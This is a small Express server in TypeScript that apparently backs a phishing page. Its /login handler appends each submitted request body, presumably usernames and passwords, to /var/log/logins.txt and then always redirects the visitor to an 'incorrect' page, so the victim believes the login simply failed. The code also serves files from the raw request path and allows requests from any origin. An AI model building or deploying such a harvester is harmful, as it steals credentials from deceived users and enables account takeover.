
import express, { Request, Response } from "express";
import cors from "cors";
import fs from 'fs';

const app = express();

let corsOptions = {
    origin : '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    allowedHeaders: ['Content-Type']
}

app.use(cors(corsOptions));

app.get("/", (req, res) => {
    res.sendFile("index.html", {root: '.'});
});

/*
 * Serve static files within the static/ directory.
 */
app.get("/static/*", (req, res) => {
    console.log(`serving static file: ${req.path}`)
    res.sendFile(req.path, {root: "."});
});

app.post('/login', (req, res) => {
    console.log("received post request");
    let body = "";
    req.on('data', (d) => {
        body += d;
    });
    req.on('end', () => {
        console.log('request body: ', body);
        const logData = `${new Date().toISOString()} ${body}\n`
        fs.appendFile("/var/log/logins.txt", logData, () => {
            res.redirect("/incorrect");
        });
    });
    // res.redirect("/incorrect");
});

app.get("/incorrect", (req, res) => {
    console.log('redirected');
    res.sendFile("incorrect.html", {root: '.'});
});

app.listen(5000);

console.log("listening on port 5000");
